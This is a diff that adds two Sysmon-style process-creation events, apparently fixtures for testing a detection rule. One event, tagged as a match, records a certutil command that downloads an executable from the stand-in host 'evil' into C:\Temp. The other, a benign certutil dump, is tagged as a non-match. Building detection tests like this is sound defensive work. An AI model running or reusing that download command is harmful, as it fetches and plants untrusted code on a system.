@@ -1,0 +1,2 @@
+{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://evil/x.exe C:\\Temp\\x.exe", "User": "CORP\\jdoe", "_match": true}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -dump C:\\file.der", "User": "CORP\\jdoe", "_match": false}
